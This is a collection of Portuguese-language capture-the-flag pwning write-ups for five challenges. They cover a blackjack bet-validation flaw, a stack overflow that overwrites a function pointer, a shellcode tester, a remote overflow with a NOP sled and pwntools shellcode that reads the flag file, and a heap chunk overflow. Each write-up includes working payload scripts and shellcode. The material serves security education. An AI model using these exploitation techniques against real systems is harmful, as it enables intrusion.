# Write-ups Pwning
## Challs com Writeup
1. [BlackJack](#blackjack)
2. [IsekaiMachine](#isekai)
3. [Testando shellcodes](#testshellcode)
4. [Remote Shellcode](#remoteshell)
5. [HEAPassword](#HEAP)

# BlackJack <a name="blackjack"></a>

```
Os habitantes do Império Weeb costumam jogar blackjack entre si com frequência, poucas coisas deixam os habitantes mais felizes do que apostas ilegais, um isekai genérico ou assistir Rock Lee vs Gaara ao som de Linking Park. Navegando pela internet eu encontrei esse código para que você pudesse jogar blackjack em seu computador também!

http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html

PS: Dou a minha flag apenas para os milionários que a mereçam. A flag não está no formato Ganesh().

Para jogar se conecte usando nc 128.61.240.205 9009
```

A ideia é ficar milionário no jogo, e a não ser que você seja muito bom em blackjack, o jeito de fazer isso não é jogando até cansar.

Perceba que [no código apresentado](https://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html), as variáveis globais são todas inteiras.

```C
//Global Variables (Linha 21)
int k;
int l;
int d;
int won;
int loss;
int cash = 500;
int bet;
int random_card;
int player_total=0;
int dealer_total;
```

O que significa isso? Todas elas vão de -2147483648 a 2147483647.

Dando uma olhada na função `betting()`, temos:

```C
int betting() //Asks user amount to bet
{ // Credo eles abrem chave na linha de baixo D:
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);
 
 if (bet > cash) //If player tries to bet more money than player has
 {
        printf("\nYou cannot bet more money than you have.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
} // End Function
```

Ou seja, a única checagem é se a aposta é maior que o valor de dinheiro, se for, ele lê novamente. Isso nos dá duas maneiras de resolver o desafio.

## Primeira Forma

A checagem se a aposta é maior que o dinheiro que você tem só é feita uma vez, depois é lido e o valor é utilizado (mesmo que seja maior), ou seja. Coloque um valor maior do que o que você tem (por exemplo 10000), irá falhar, então, coloque um valor maior que 1 milhão (por exemplo 2000000). A aposta será válida.

Ganhe o jogo e a flag será impressa :D

## Segunda Forma

Se você for tão bom de blackjack quanto eu, essa provavelmente é a melhor maneira.

Como o valor é um inteiro, e não um unsigned int, é possível fazer apostas de valores negativos.

Aposte um valor negativo grande (como -2000000) e perca o jogo, você perderá -2000000, ou seja -(-2000000) = 2000000. O que te fará ser um milionário e imprimirá a flag.

Flag: `YaY_I_AM_A_MILLIONARE_LOL`

# Isekai Machine <a name="isekai"></a>
```
Você foi atropelado por um caminhão e descobriu que possui a chance de reencarnar em um mundo de algum anime pela Isekai Machine. Mas parece que ela tem alguns problemas e você pode acabar parando em um mundo indesejado. Você consegue passar pela Isekai Machine e ter uma boa segunda vida?

Caso esteja tendo problemas com o teste remoto coloque um '\n' no fim do que enviar.
```

O chall vem com o seguinte código-fonte:

```
#include <stdio.h>

void good_ending() {
        // REDACTED
}

void bad_ending() {
        printf("A máquina de isekai sobreaqueceu, você foi parar em Attack on Titan e foi comido por um titan\n");
        printf("BAD ENDING\N");
}

int main(void) {
        char buffer[8];
        void (*destino) () = bad_ending;

        printf("Escreva o mundo que você deseja ser reincarnado: ");
        fflush(stdout);
        scanf("%s", buffer);

        destino();

        return 0;
}
```

Pela descrição do chall, nosso objetivo é chamar essa função misteriosa chamada `good_ending()`.

Podemos perceber que há um buffer overflow com o `scanf()`, já que ele não especifica o limite de leitura. Como há um ponteiro de função na stack que é chamado, é possível que possamos usá-lo para redirecionar o fluxo do programa.

Olhando o disassembly da função no GDB:

```
Dump of assembler code for function main:
   0x0000000000401251 <+0>:     endbr64
   0x0000000000401255 <+4>:     push   rbp
   0x0000000000401256 <+5>:     mov    rbp,rsp
   0x0000000000401259 <+8>:     sub    rsp,0x10
   0x000000000040125d <+12>:    mov    QWORD PTR [rbp-0x8],0x401232
   0x0000000000401265 <+20>:    mov    edi,0x4020d8
   0x000000000040126a <+25>:    mov    eax,0x0
   0x000000000040126f <+30>:    call   0x4010b0 <printf@plt>
   0x0000000000401274 <+35>:    mov    rax,QWORD PTR [rip+0x2ddd]        # 0x404058 <stdout@@GLIBC_2.2.5>
   0x000000000040127b <+42>:    mov    rdi,rax
   0x000000000040127e <+45>:    call   0x4010c0 <fflush@plt>
   0x0000000000401283 <+50>:    lea    rax,[rbp-0x10]
   0x0000000000401287 <+54>:    mov    rsi,rax
   0x000000000040128a <+57>:    mov    edi,0x40210b
   0x000000000040128f <+62>:    mov    eax,0x0
   0x0000000000401294 <+67>:    call   0x4010e0 <__isoc99_scanf@plt>
   0x0000000000401299 <+72>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040129d <+76>:    mov    eax,0x0
   0x00000000004012a2 <+81>:    call   rdx
   0x00000000004012a4 <+83>:    mov    eax,0x0
   0x00000000004012a9 <+88>:    leave
   0x00000000004012aa <+89>:    ret
End of assembler dump.
```

Olhando as operações inicias de stack, temos:

```
Dump of assembler code for function main:
   0x0000000000401251 <+0>:     endbr64
   0x0000000000401255 <+4>:     push   rbp                            ; Coloca o rbp na stack
   0x0000000000401256 <+5>:     mov    rbp,rsp                        ; Atualiza o rbp para a stack atual
   0x0000000000401259 <+8>:     sub    rsp,0x10                       ; Aloca 16 bytes na stack
   0x000000000040125d <+12>:    mov    QWORD PTR [rbp-0x8],0x401232   ; Atribui 0x401232 para [rbp-8]
   ...
```

Nota-se que o programa está compilado em 64-bits, já que os endereços possuem 8 bytes e é utilizado registradores começados em 'r', como `rbp` e `rsp`. Portanto, a estrutura da stack é a seguinte:
```
        +----------+
 rsp -> |  Stack   | (16 bytes)
        |  Frame   |
        +----------+
 rbp -> |rbp antigo| (8 bytes)
        +----------+
        | Ret Addr | (8 bytes)
        +----------+
```

Em que há o valor `0x401232` sendo inicializado em `rbp-8`. Se olharmos novamente o código-fonte, percebemos que a única inicialização de variável ocorre com o ponteiro de função. Então `0x401232` deve ser o endereço da função `bad_ending()`. Podemos conferir no GDB, imprimindo o endereço dessa função.

```
(gdb) print bad_ending
$1 = {<text variable, no debug info>} 0x401232 <bad_ending>
```

Agora precisamos saber onde o buffer está. Focando nos argumentos da `scanf()`, temos as seguintes instruções:
```
   ...
   0x0000000000401283 <+50>:    lea    rax,[rbp-0x10]    ; Carrega o buffer (rbp-16) em rax
   0x0000000000401287 <+54>:    mov    rsi,rax           ; Coloca o buffer em rsi (2º argumento em função de 64-bits)
   0x000000000040128a <+57>:    mov    edi,0x40210b      ; Coloca a format string em rdi (1º argumento em função de 64-bits)
   0x000000000040128f <+62>:    mov    eax,0x0
   0x0000000000401294 <+67>:    call   0x4010e0 <__isoc99_scanf@plt>
   ...
```

Portanto, o buffer está em rbp-16. Como o buffer está antes do ponteiro de função, concluímos que é possivel sobrescrever esse ponteiro.

Como a stack está organizada assim:

```
        +----------+
 rsp -> |  buffer  | (16 bytes)    <- [rbp-16]
        | func_ptr |
        +----------+
 rbp -> |rbp antigo| (8 bytes)
        +----------+
        | Ret Addr | (8 bytes)
        +----------+
```

Então após escrevermos 8 bytes no buffer, estaremos imediatamente sobrescrevendo o ponteiro de função.

Precisamos do endereço da função `good_ending()`, então podemos encontrá-la no GDB:

```
(gdb) print good_ending
$2 = {<text variable, no debug info>} 0x4011d6 <good_ending>
```

Utilizando o seguinte payload:
```
python -c "print('A' * 8 + '\xd6\x11\x40\x00\x00\x00\x00\x00')" | ./isekai_machine
```

Obtemos a flag:
```
Escreva o mundo que você deseja ser reincarnado:
Você foi parar em...
Continua no próximo episódio. Toma sua flag
Ganesh{p0wer_0f_fr13ndsh1p}
```

# [GUIDED] Testando shellcodes <a name="testshellcode"></a>
```
Consegui um shellcode, mas não sei como testá-lo. Você pode testar para mim? Ele foi escrito em 32-bits.

"\xeb\x17\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x1b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x47\x61\x6e\x65\x73\x68\x7b\x74\x33\x73\x74\x31\x6e\x67\x5f\x73\x68\x33\x6c\x6c\x63\x30\x64\x33\x35\x7d\x0a"
```

Utilizando o seguinte programa para testar shellcodes:
```
void (*shellcode)() = "[insira seu shellcode aqui]";

int main(void) {
    (*shellcode)();
    return 0;
}
```

Podemos inserir o shellcode nele:
```
void (*shellcode)() = "\xeb\x17\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x1b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x47\x61\x6e\x65\x73\x68\x7b\x74\x33\x73\x74\x31\x6e\x67\x5f\x73\x68\x33\x6c\x6c\x63\x30\x64\x33\x35\x7d\x0a";

int main(void) {
    (*shellcode)();
    return 0;
}
```

Compilar o programa em 32-bits:

```
gcc testador.c -o testador -m32 -z execstack -Wno-incompatible-pointer-types
```

E rodar esse programa para conseguir a flag:

```
./testador
Ganesh{t3st1ng_sh3llc0d35}
```

# Remote Shellcode <a name="remoteshell"></a>
```
Hora de testar suas skills com shellcode. Você consegue pwnar remotamente? Sabe-se que dando break main e pegando o endereço logo depois do retorno no gdb do servidor, o endereço é 0xffffd7a0.

A flag está em '/home/ganesh/flag.txt'

Dica: use shellcraft.cat('/home/ganesh/flag.txt') invés de shellcraft.sh()

Caso esteja tendo problemas ao rodar o arquivo que demos, use o comando readelf -a e veja quais bibliotecas estão faltando.

```

Abrindo o código-fonte fornecido pelo chall:

```
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
        char buffer[8];

        scanf("%[^\n]", buffer);

        return 0;
}
```

Podemos esperar um buffer de 8 bytes com buffer overflow. Precisamos checar agora a distancia entre o começo do buffer e endereço de retorno. Para isso, vamos abrir no GDB e fazer o disassembly:

```
Dump of assembler code for function main:
   0x08049196 <+0>:     endbr32
   0x0804919a <+4>:     push   ebp
   0x0804919b <+5>:     mov    ebp,esp
   0x0804919d <+7>:     push   ebx
   0x0804919e <+8>:     sub    esp,0x8
   0x080491a1 <+11>:    call   0x80491ca <__x86.get_pc_thunk.ax>
   0x080491a6 <+16>:    add    eax,0x2e5a
   0x080491ab <+21>:    lea    edx,[ebp-0xc]
   0x080491ae <+24>:    push   edx
   0x080491af <+25>:    lea    edx,[eax-0x1ff8]
   0x080491b5 <+31>:    push   edx
   0x080491b6 <+32>:    mov    ebx,eax
   0x080491b8 <+34>:    call   0x8049070 <__isoc99_scanf@plt>
   0x080491bd <+39>:    add    esp,0x8
   0x080491c0 <+42>:    mov    eax,0x0
   0x080491c5 <+47>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080491c8 <+50>:    leave
   0x080491c9 <+51>:    ret
End of assembler dump.
```

Olhando as linhas iniciais de operações de stack:
```
Dump of assembler code for function main:
   0x08049196 <+0>:     endbr32
   0x0804919a <+4>:     push   ebp
   0x0804919b <+5>:     mov    ebp,esp
   0x0804919d <+7>:     push   ebx
   0x0804919e <+8>:     sub    esp,0x8
   ...
End of assembler dump.
```

Podemos ver que os registradores salvos na stack foram o ebp e o ebx. Podemos também conferir o começo do buffer:

```
Dump of assembler code for function main:
   ...
   0x080491ab <+21>:    lea    edx,[ebp-0xc]    ; Carrega o endereço do buffer
   0x080491ae <+24>:    push   edx              ; Coloca o endereço na stack
   0x080491af <+25>:    lea    edx,[eax-0x1ff8] ; Carrega o endereço da format string
   0x080491b5 <+31>:    push   edx              ; Coloca o endereço na stack
   0x080491b6 <+32>:    mov    ebx,eax
   0x080491b8 <+34>:    call   0x8049070 <__isoc99_scanf@plt>
   ...
End of assembler dump.
```

Vemos que o endereço do buffer é ebp-12. Portanto, a organização da stack é a seguinte:

```
        +----------+
 esp -> |  Stack   | (8 bytes) <- [ebp-12]
        |  Frame   |           <- [ebp-8]
        +----------+
        |ebx antigo| (4 bytes) <- [ebp-4]
        +----------+
 ebp -> |ebp antigo| (4 bytes)
        +----------+
        | Ret Addr | (4 bytes)
        +----------+
```

Dessa forma, temos que preencher 16 bytes até chegarmos ao endereço de retorno, então colocamos o endereço de retorno e depois o shellcode.

Para esse chall, vamos usar o endereço dado pelo chall como o endereço de retorno e o `shellcraft.cat('/home/ganesh/flag.txt')` do pwntools para pegar a flag, como sugerido na descrição do chall. Também adicionaremos um NOP sled para ter uma margem de erro maior.

Utilizaremos o endereço de retorno somado com metade do NOP sled para ter mais chances do endereço de retorno acertar algum lugar do NOP sled. Exemplos de situação:

Se o endereço de retorno estiver exatamente correto:
```
        +----------+
Inicio->|          |    <- Endereço de retorno
 Meio ->| NOP sled |    <- Endereço + meio NOP sled
  Fim ->|          |
        +----------+
        | Shellcode|
        +----------+
```

Se o endereço de retorno estiver meio NOP sled para frente:
```
        +----------+
Inicio->|          |
 Meio ->| NOP sled |    <- Endereço de retorno
  Fim ->|          |    <- Endereço + meio NOP sled
        +----------+
        | Shellcode|
        +----------+
```

Se o endereço de retorno estiver meio NOP sled para trás:
```
        |    ...   |    <- Endereço de retorno
        +----------+
Inicio->|          |    <- Endereço + meio NOP sled
 Meio ->| NOP sled |
  Fim ->|          |
        +----------+
        | Shellcode|
        +----------+
```

Agora que sabemos o que devemos fazer, vamos escrever o payload. Ele será o seguinte:

```python
#!/usr/bin/env python3

from pwn import *

# Faz o buffer overflow
payload = b'A' * 16                    # Preenche a stack até o endereço de retorno
payload += p32(0xffffd7a0+0x200)       # Coloca o endereço do shellcode + metade do NOP sled

# Coloca o shellcode
context.arch = 'i386'                                      # Define a arquitetura
context.bits = 32                                          # Define como 32-bits
payload += b'\x90' * 1000                                  # Coloca o NOP sled
payload += asm(shellcraft.cat('/home/ganesh/flag.txt'))    # Coloca o shellcode
payload += b'\n'

# Escreve para um arquivo
f = open('exploit.txt', 'wb')          # Abre um arquivo para escrita
f.write(payload)                       # Escreve o payload
f.close()                              # Fecha o arquivo
```

Rodando esse script com `python3 script.py` ou `./script.py`, é gerado um arquivo chamado `exploit.txt`. Agora enviando esse exploit para o servidor:

```
cat exploit.txt | nc [insira o servidor e a porta aqui]
Ganesh{y0u_g0t_pwn3d}
```

Conseguimos a flag.

# HEAPassword <a name="HEAP"></a>
```
Esse desafio é extra! Faça ele somente se tiver feito todos que não são ou prepare-se para frustração.

Me parece que esse é mais um daqueles crackme. Exceto que eu não consigo digitar uma senha! Será que tem algum jeito de inserir uma senha?

Referências: https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/
```

Olhando o código-fonte, temos:

```c
#include <stdio.h>
#include <stdlib.h>

int main(void){
    char *buffer = NULL;
    int *password = NULL;
    FILE *flag_file = NULL;
    char flag[100];

    buffer = (char *) malloc(8 * sizeof(char));
    password = (int *) malloc(4 * sizeof(int));

    if(buffer != NULL && password != NULL){
        scanf("%s", buffer);

        if((password[0] == 1) && (password[1] == 2) && (password[2] == 3) && (password[3] == 4)){
            printf("Parabens!\n");
            flag_file = fopen("flagheap1.txt", "r");
                    fscanf(flag_file, "%100s", flag);
                    printf("%s\n", flag);
                    fclose(flag_file);
        }else{
            printf("Tente novamente!\n");
            printf("Seu buffer: %s\n", buffer);
            printf("Sua senha: %d-%d-%d-%d\n", password[0], password[1], password[2], password[3]);
        }
    }

    return 0;
}
```

Podemos ver um buffer overflow no scanf() e que o buffer está alocado na heap.

Na heap, a memória alocada é armazenada em chunks que seguem o seguinte formato:

```
+----------+
| prev_size| (4 ou 8 bytes)
+----------+
|   size   | (4 ou 8 bytes)
+----------+
| conteudo | (o quanto foi pedido no malloc, em múltiplos de 8 ou 16)
+----------+
```

O tamanho de cada elemento do chunk depende se o sistema é de 32-bits ou 64-bits. Usando o comando file no executável:

```
file crackme_i_guess
crackme_i_guess: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3ace4aaee27d5aee944db3932625ac3e1b878a53, for GNU/Linux 3.2.0, not stripped
```

Vemos que ele é um ELF 64-bit. Portanto, cada elemento do cabeçalho terá 8 bytes e o conteúdo terá um tamanho multiplo de 16 bytes.

De acordo com o código-fonte, as alocações tem os seguintes tamanhos:

```
buffer = (char *) malloc(8 * sizeof(char));
password = (int *) malloc(4 * sizeof(int));
```

O buffer teria 8 bytes, mas como é alinhado a 16 bytes, então ele terá 16 bytes (arredonda para o multiplo de 16 mais próximo). Já o password são 16 bytes, então já está alinhado. Portanto, a organização dessas alocações na heap é a seguinte:

```
+----------+
| prev_size| (8 bytes)
+----------+
|   size   | (8 bytes)
+----------+
|  buffer  | (16 bytes)
+----------+
| prev_size| (8 bytes)
+----------+
|   size   | (8 bytes)
+----------+
| password | (16 bytes)
+----------+
```

Para começarmos a sobrescrever o campo password, precisamos preencher o buffer (16 bytes) e os dois campos de cabeçalho (2 de 8 bytes), totalizando 32 bytes. A partir daí, temos que escrever os inteiros da senha dada pelo código-fonte em little-endian. Podemos fazer isso com o seguinte script em Python:

```python
#!/usr/bin/env python3

# Pedaços do payload
padding = b'A' * 32
password1 = b'\x01\x00\x00\x00'
password2 = b'\x02\x00\x00\x00'
password3 = b'\x03\x00\x00\x00'
password4 = b'\x04\x00\x00\x00'
newline = b'\n'    # Sugerido pelo chall para evitar problemas com o servidor

# Escreve em um arquivo
f = open("exploit.txt", "wb")
f.write(padding + password1 + password2 + password3 + password4)
f.close()
```

Enviado para o servidor:

```
cat exploit.txt | nc [insira o servidor e a porta aqui]
Parabens!
Ganesh{y0ur_buff3r_1s_th3_buff3r_th4t_w1ll_p1erc3_th3_chunk5}
```

É possível fazer também com o echo, utilizando o seguinte comando:

```
echo -e "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00" | nc [insira o servidor e a porta aqui]
Parabens!
Ganesh{y0ur_buff3r_1s_th3_buff3r_th4t_w1ll_p1erc3_th3_chunk5}
```
